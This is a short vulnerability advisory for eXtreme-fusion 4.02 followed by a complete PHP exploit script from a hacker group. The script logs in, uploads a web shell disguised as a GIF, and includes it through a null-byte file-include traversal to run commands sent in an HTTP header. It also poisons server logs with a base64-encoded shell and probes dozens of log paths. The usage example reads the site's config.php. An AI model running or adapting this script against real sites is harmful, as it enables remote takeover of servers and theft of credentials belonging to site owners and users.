source: http://www.securityfocus.com/bid/21621/info

eXtreme-fusion is prone to a local file-include vulnerability because the application fails to properly sanitize user-supplied input.

Exploiting this issue may allow an unauthorized user to view files and execute local scripts. By combining this issue with the file-upload functionality of the application, the attacker may be able to execute remote code.

eXtreme-fusion version 4.02 is vulnerable to this issue; other versions may also be affected.

<?

print '
:::::::::  :::::::::: :::     ::: ::::::::::: :::        
:+:    :+: :+:        :+:     :+:     :+:     :+:        
+:+    +:+ +:+        +:+     +:+     +:+     +:+        
+#+    +:+ +#++:++#   +#+     +:+     +#+     +#+        
+#+    +#+ +#+         +#+   +#+      +#+     +#+        
#+#    #+# #+#          #+#+#+#       #+#     #+#        
#########  ##########     ###     ########### ########## 
::::::::::: ::::::::::     :::     ::::    ::::  
    :+:     :+:          :+: :+:   +:+:+: :+:+:+ 
    +:+     +:+         +:+   +:+  +:+ +:+:+ +:+ 
    +#+     +#++:++#   +#++:++#++: +#+  +:+  +#+ 
    +#+     +#+        +#+     +#+ +#+       +#+ 
    #+#     #+#        #+#     #+# #+#       #+# 
    ###     ########## ###     ### ###       ### 
	
   - - [DEVIL TEAM THE BEST POLISH TEAM] - -
 

[Exploit name: extreme-fusion <= 4.02 Remote Code Execution Exploit
[Script name: eXtreme-fusion 4.02
[Script site: http://extreme-fusion.pl/download-cat16
dork: "Powered by: PHP-Fusion"

Find by: Kacper (a.k.a Rahim)


========>  DEVIL TEAM IRC: irc.milw0rm.com:6667 #devilteam  <========
========>         http://www.rahim.webd.pl/            <========

Contact: kacper1964@yahoo.pl

(c)od3d by Kacper
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
Greetings DragonHeart and all DEVIL TEAM Patriots :)
- Leito & Leon | friend str0ke ;)
pepi, nukedclx, SkD, MXZ, sysios, mIvus, wacky, xoron, fdj, mass, D3m0n (ziom z Niemiec :P)

 and
 
Dr Max Virus
TamTurk,
hackersecurity.org

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
                Greetings for 4ll Fusi0n Group members ;-)
                and all members of hacker.com.pl ;)
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
';


/*
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
in file infusions/fusion_forum_view/fusion_forum_view.php:
[line 1-5]
....
<?
if (file_exists(INFUSIONS."fusion_forum_view/locale/".$settings['locale'].".php")) { // <-------{2}
include INFUSIONS."fusion_forum_view/locale/".$settings['locale'].".php"; // <-------{1}
} else {
include INFUSIONS."fusion_forum_view/locale/English.php";
....
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
in file submit.php:
[line 342-373]
....
	if (isset($_POST['submit_photo'])) {
		require_once INCLUDES."photo_functions_include.php";
		$error = "";
		$submit_info['photo_title'] = stripinput($_POST['photo_title']);
		$submit_info['photo_description'] = stripinput($_POST['photo_description']);
		$submit_info['album_id'] = isNum($_POST['album_id']) ? $_POST['album_id'] : "0";
		if (is_uploaded_file($_FILES['photo_pic_file']['tmp_name'])) {
			$photo_types = array(".gif",".jpg",".jpeg",".png");
			$photo_pic = $_FILES['photo_pic_file'];
			$photo_name = strtolower(substr($photo_pic['name'], 0, strrpos($photo_pic['name'], ".")));
			$photo_ext = strtolower(strrchr($photo_pic['name'],"."));
			$photo_dest = PHOTOS."submissions/";
			if (!preg_match("/^[-0-9A-Z_\[\]]+$/i", $photo_name)) {
				$error = 1;
			} elseif ($photo_pic['size'] > $settings['photo_max_b']){
				$error = 2;
			} elseif (!in_array($photo_ext, $photo_types)) {
				$error = 3;
			} else {
				$photo_file = image_exists($photo_dest, $photo_name.$photo_ext);
				move_uploaded_file($photo_pic['tmp_name'], $photo_dest.$photo_file);     // <-------{3(step1)}
				chmod($photo_dest.$photo_file, 0644);
				$imagefile = @getimagesize($photo_dest.$photo_file);
				if (!verify_image($photo_dest.$photo_file)) {
					$error = 3;
					unlink($photo_dest.$photo_file);
				} elseif ($imagefile[0] > $settings['photo_max_w'] || $imagefile[1] > $settings['photo_max_h']) {
					$error = 4;
					unlink($photo_dest.$photo_file);
				} else {
					$submit_info['photo_file'] = $photo_file;
				}
			}
		}
....
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
in file submit.php:
[line 223-250]
....
	if (isset($_POST['upload'])) {
		opentable($locale['552']);
		if ($_FILES['plik']['name']!="")
		{
			if(!file_exists("downloads/".$_FILES['plik']['name'])) {			
				move_uploaded_file($_FILES['plik']['tmp_name'],"downloads/".$_FILES['plik']['name']);  // <-------{3(step2)}
				switch($_FILES['plik']['error']) {
		 			case '0': echo $locale['542'].round($_FILES['plik']['size'] / 1024).'KB';
						$submit_info['download_title'] = stripinput($_POST['download_title']);
						$submit_info['download_description'] = stripinput($_POST['download_description']);
						$submit_info['download_url'] = "downloads/".$_FILES['plik']['name'];
						$submit_info['download_adres'] = stripinput($_POST['download_adres']);
						$submit_info['download_cat'] = stripinput($_POST['download_category']);
						$submit_info['download_license'] = stripinput($_POST['download_license']);
						$submit_info['download_os'] = stripinput($_POST['download_os']);
						$submit_info['download_version'] = stripinput($_POST['download_version']);
						$submit_info['download_filesize'] = $_FILES['plik']['size'];
						$result = dbquery("INSERT INTO ".$db_prefix."submissions VALUES('', 'f', '".$userdata['user_id']."', '".time()."', '".serialize($submit_info)."')");
					break;
					case '1': echo $locale['543']; break;
					case '2': echo $locale['544']; break;
					case '3': echo $locale['545']; break;
					case '4': echo $locale['546']; break;
				}
			} else {
				echo $locale['547'];
			}
		}
....
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

by Kacper ;-)
*/
if ($argc<7) {
print_r('
-----------------------------------------------------------------------------
Usage: php '.$argv[0].' host path username password user_id cmd OPTIONS
host:       target server (ip/hostname)
path:       extreme-fusion path
username:   You username
password:   You password
user_id:    you user id
cmd:        a shell command (ls -la)
Options:
 -p[port]:    specify a port other than 80
 -P[ip:port]: specify a proxy
Example:
php '.$argv[0].' 127.0.0.1 /extreme-fusion/ rahim hauru 105 ls -la
php '.$argv[0].' 127.0.0.1 /extreme-fusion/ rahim hauru 105 cat ../../../../config.php -P1.1.1.1:80
-----------------------------------------------------------------------------
');

die;
}

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacket($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}
function make_seed()
{
   list($usec, $sec) = explode(' ', microtime());
   return (float) $sec + ((float) $usec * 100000);
}

$host=$argv[1];
$path=$argv[2];
$username=$argv[3];
$password=$argv[4];
$user_id=$argv[5];
$cmd="";

$port=80;
$proxy="";
for ($i=6; $i<$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp<>"-p") and ($temp<>"-P")) {$cmd.=" ".$argv[$i];}
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

$data.='-----------------------------7d6224c08dc
Content-Disposition: form-data; name="user_name"

'.$username.'
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="user_pass"

'.$password.'
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="remember_me"

y
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="login"

Login
-----------------------------7d6224c08dc--
';


echo "login...\n";
$packet ="POST ".$p."login.php HTTP/1.0\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d6224c08dc\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Cookie: fusion_user=".$user_id.".".md5($password).";\r\n";
$packet.="Cookie: fusion_visited=yes;\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacket($packet);
sleep(1);

$hauru=
"\x20\x0d\x0a\x47\x49\x46\x38\x36\x0d\x0a\x3c\x3f\x70\x68\x70\x20".
"\x6f\x62\x5f\x63\x6c\x65\x61\x6e\x28\x29\x3b\x0d\x0a\x2f\x2f\x52".
"\x75\x63\x68\x6f\x6d\x79\x20\x7a\x61\x6d\x65\x6b\x20\x48\x61\x75".
"\x72\x75\x20\x3b\x2d\x29\x0d\x0a\x65\x63\x68\x6f\x22\x2e\x2e\x2e".
"\x48\x61\x63\x6b\x65\x72\x2e\x2e\x4b\x61\x63\x70\x65\x72\x2e\x2e".
"\x4d\x61\x64\x65\x2e\x2e\x69\x6e\x2e\x2e\x50\x6f\x6c\x61\x6e\x64".
"\x21\x21\x2e\x2e\x2e\x44\x45\x56\x49\x4c\x2e\x54\x45\x41\x4d\x2e".
"\x2e\x74\x68\x65\x2e\x2e\x62\x65\x73\x74\x2e\x2e\x70\x6f\x6c\x69".
"\x73\x68\x2e\x2e\x74\x65\x61\x6d\x2e\x2e\x47\x72\x65\x65\x74\x7a".
"\x2e\x2e\x2e\x22\x3b\x0d\x0a\x20\x0d\x0a\x20\x0d\x0a\x65\x63\x68".
"\x6f\x22\x2e\x2e\x2e\x47\x6f\x20\x54\x6f\x20\x44\x45\x56\x49\x4c".
"\x20\x54\x45\x41\x4d\x20\x49\x52\x43\x3a\x20\x37\x32\x2e\x32\x30".
"\x2e\x31\x38\x2e\x36\x3a\x36\x36\x36\x37\x20\x23\x64\x65\x76\x69".
"\x6c\x74\x65\x61\x6d\x22\x3b\x0d\x0a\x20\x0d\x0a\x20\x0d\x0a\x65".
"\x63\x68\x6f\x22\x2e\x2e\x2e\x44\x45\x56\x49\x4c\x20\x54\x45\x41".
"\x4d\x20\x53\x49\x54\x45\x3a\x20\x68\x74\x74\x70\x3a\x2f\x2f\x77".
"\x77\x77\x2e\x72\x61\x68\x69\x6d\x2e\x77\x65\x62\x64\x2e\x70\x6c".
"\x2f\x22\x3b\x0d\x0a\x20\x0d\x0a\x20\x0d\x0a\x69\x6e\x69\x5f\x73".
"\x65\x74\x28\x22\x6d\x61\x78\x5f\x65\x78\x65\x63\x75\x74\x69\x6f".
"\x6e\x5f\x74\x69\x6d\x65\x22\x2c\x30\x29\x3b\x0d\x0a\x20\x0d\x0a".
"\x20\x0d\x0a\x65\x63\x68\x6f\x20\x22\x48\x61\x75\x72\x75\x22\x3b".
"\x0d\x0a\x20\x0d\x0a\x20\x0d\x0a\x70\x61\x73\x73\x74\x68\x72\x75".
"\x28\x24\x5f\x53\x45\x52\x56\x45\x52\x5b\x48\x54\x54\x50\x5f\x48".
"\x41\x55\x52\x55\x5d\x29\x3b\x0d\x0a\x20\x0d\x0a\x20\x0d\x0a\x64".
"\x69\x65\x3b\x3f\x3e\x0d\x0a\x20";

$data.='-----------------------------7d6224c08dc
Content-Disposition: form-data; name="photo_title"

DEVIL TEAM Hackers ;)
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="photo_description"

Hauru
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="photo_pic_file"; filename="hauru.gif"
Content-Type: text/plain

'.$hauru.'
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="album_id"

1
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="submit_photo"

Add Photo
-----------------------------7d6224c08dc--
';


echo "upload Hauru!! (step 1)...\n";
$packet ="POST ".$p."submit.php?stype=p HTTP/1.0\r\n";
$packet.="Cookie: fusion_user=".$user_id.".".md5($password).";\r\n";
$packet.="Cookie: fusion_visited=yes;\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d6224c08dc\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacket($packet);
sleep(1);

echo "Hauru uploaded!! now remote code execution (step1)...\n";
$packet ="GET ".$p."infusions/fusion_forum_view/fusion_forum_view.php?settings[locale]=../../../../images/photoalbum/submissions/hauru.gif%00 HTTP/1.1\r\n";
$packet.="HAURU: ".$cmd."\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacket($packet);
if (strstr($html,"Hauru"))
{
$temp=explode("Hauru",$html);
die($temp[1]);
}


$data.='-----------------------------7d6224c08dc
Content-Disposition: form-data; name="plik"; filename="hauru.gif"
Content-Type: text/plain

'.$hauru.'
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="download_title"

DEVIL TEAM
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="download_description"

http://www.rahim.webd.pl/
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="download_category"

1
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="download_license"

Kacper
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="download_adres"

http://www.rahim.webd.pl/
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="download_os"

h4cking
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="download_version"

666
-----------------------------7d6224c08dc
Content-Disposition: form-data; name="upload"

Send File
-----------------------------7d6224c08dc--
';

echo "upload Hauru!! (step 2)...\n";
$packet ="POST ".$p."submit.php?stype=f HTTP/1.0\r\n";
$packet.="Cookie: fusion_user=".$user_id.".".md5($password).";\r\n";
$packet.="Cookie: fusion_visited=yes;\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d6224c08dc\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacket($packet);
sleep(1);

echo "Hauru uploaded!! now remote code execution (step2)...\n";
$packet ="GET ".$p."infusions/fusion_forum_view/fusion_forum_view.php?settings[locale]=../../../../downloads/hauru.gif%00 HTTP/1.1\r\n";
$packet.="HAURU: ".$cmd."\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacket($packet);
if (strstr($html,"Hauru"))
{
$temp=explode("Hauru",$html);
die($temp[1]);
}

echo "insert evil code in logfiles (step3 - last)...\r\n\r\n";
$calcifer = base64_decode("PD9waHAgb2JfY2xlYW4oKTsvL1J1Y2hvbXkgemFtZWsgSGF1cnUgOy0pZWNobyIuL".
"i5IYWNrZXIuLkthY3Blci4uTWFkZS4uaW4uLlBvbGFuZCEhLi4uREVWSUwuVEVBTS".
"4udGhlLi5iZXN0Li5wb2xpc2guLnRlYW0uLkdyZWV0ei4uLiI7ZWNobyIuLi5HbyB".
"UbyBERVZJTCBURUFNIElSQzogNzIuMjAuMTguNjo2NjY3ICNkZXZpbHRlYW0iO2Vj".
"aG8iLi4uREVWSUwgVEVBTSBTSVRFOiBodHRwOi8vd3d3LnJhaGltLndlYmQucGwvI".
"jtpbmlfc2V0KCJtYXhfZXhlY3V0aW9uX3RpbWUiLDApO2VjaG8gIkhhdXJ1IjtwYX".
"NzdGhydSgkX1NFUlZFUltIVFRQX0hBVVJVXSk7ZGllOz8+");


$packet="GET ".$p.$calcifer." HTTP/1.0\r\n";
$packet.="User-Agent: ".$calcifer." Googlebot/2.1\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: close\r\n\r\n";
sendpacket($packet);
sleep(1);


$paths= array (
"../../../../../var/log/httpd/access_log",
"../../../../../var/log/httpd/error_log",
"../apache/logs/error.log",
"../apache/logs/access.log",
"../../apache/logs/error.log",
"../../apache/logs/access.log",
"../../../apache/logs/error.log",
"../../../apache/logs/access.log",
"../../../../apache/logs/error.log",
"../../../../apache/logs/access.log",
"../../../../../apache/logs/error.log",
"../../../../../apache/logs/access.log",
"../logs/error.log",
"../logs/access.log",
"../../logs/error.log",
"../../logs/access.log",
"../../../logs/error.log",
"../../../logs/access.log",
"../../../../logs/error.log",
"../../../../logs/access.log",
"../../../../../logs/error.log",
"../../../../../logs/access.log",
"../../../../../etc/httpd/logs/access_log",
"../../../../../etc/httpd/logs/access.log",
"../../../../../etc/httpd/logs/error_log",
"../../../../../etc/httpd/logs/error.log",
"../../../../../var/www/logs/access_log",
"../../../../../var/www/logs/access.log",
"../../../../../usr/local/apache/logs/access_log",
"../../../../../usr/local/apache/logs/access.log",
"../../../../../var/log/apache/access_log",
"../../../../../var/log/apache/access.log",
"../../../../../var/log/access_log",
"../../../../../var/www/logs/error_log",
"../../../../../var/www/logs/error.log",
"../../../../../usr/local/apache/logs/error_log",
"../../../../../usr/local/apache/logs/error.log",
"../../../../../var/log/apache/error_log",
"../../../../../var/log/apache/error.log",
"../../../../../var/log/access_log",
"../../../../../var/log/error_log"
);

for ($i=0; $i<=count($paths)-1; $i++)
{
$a=$i+2;
echo "if register_globals = On"\r\n";
echo "[".$a."] Check Path: ".$paths[$i]."\r\n";
echo "remote code execution in logifiles...wait..\n";
$packet ="GET ".$p."infusions/fusion_forum_view/fusion_forum_view.php?settings[locale]=../../../../".$paths[$i]."%00 HTTP/1.1\r\n";
$packet.="HAURU: ".$cmd."\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacket($packet);
if (strstr($html,"Hauru"))
{
$temp=explode("Hauru",$html);
die($temp[1]);
}
}
echo "Exploit err0r :(\n";
echo "Check register_globals = On and magic_quotes_gpc = off\n";
echo "Go to DEVIL TEAM IRC: irc.milw0rm.com:6667 #devilteam\r\n";
?>